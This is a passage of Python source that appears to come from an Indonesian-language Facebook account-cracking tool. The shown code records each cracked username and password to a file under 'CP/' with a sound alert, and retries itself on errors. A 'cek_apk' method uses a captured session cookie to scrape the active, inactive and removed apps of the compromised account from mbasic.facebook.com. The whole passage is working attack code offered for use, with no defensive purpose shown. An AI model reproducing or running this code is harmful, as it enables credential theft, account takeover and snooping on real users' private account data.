						print (f'\r{p}└─── {k}{user} ◊ {pw} \n{p}  └─ {k}{day} {month} {year}  ')
						os.popen("play-audio data/dapet.mp3")
						check.append(f"{user} ◊ {pw} ◊ {day} {month} {year}")
						open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} \n")
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}└─── {k}{user} ◊ {pw}           ')
					os.popen("play-audio data/dapet.mp3")
					check.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
					
			lopev +=1
		except:
			self.Crackers(user, peweh, url_log)
		
	#--- CEK APLIKASI 
	def cek_apk(self,kukis):
		w=self.romzz.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text 
		sop = bs4.BeautifulSoup(w,"html.parser")
		x = sop.find("form",method="post")
		game = [i.text for i in x.find_all("h3")]
		try:
			for i in range(len(game)):
				print ("\r     %s└─ %s. %s%s"%(p,i+1,o,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
		except AttributeError:
			print ("\r     %s└─ %sgagal mengecek game"%(p,m))
		w=self.romzz.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text 
		sop = bs4.BeautifulSoup(w,"html.parser")
		x = sop.find("form",method="post")
		game = [i.text for i in x.find_all("h3")]
		try:
			for i in range(len(game)):
				print ("\r     %s└─ %s. %s%s"%(p,i+1,m,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
		except AttributeError:
			print ("\r     %s└─ %sgagal mengecek game"%(p,m))
		w=self.romzz.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",cookies={"cookie":"noscript=1;"+kukis}).text 
		sop = bs4.BeautifulSoup(w,"html.parser")
		x = sop.find("form",method="post")
		game = [i.text for i in x.find_all("h3")]
		try:
			for i in range(len(game)):
				print ("\r     %s└─ %s. %s%s"%(p,i+1,j,game[i].replace("Dihapus"," Dihapus")))
		except:
			pass
			
		
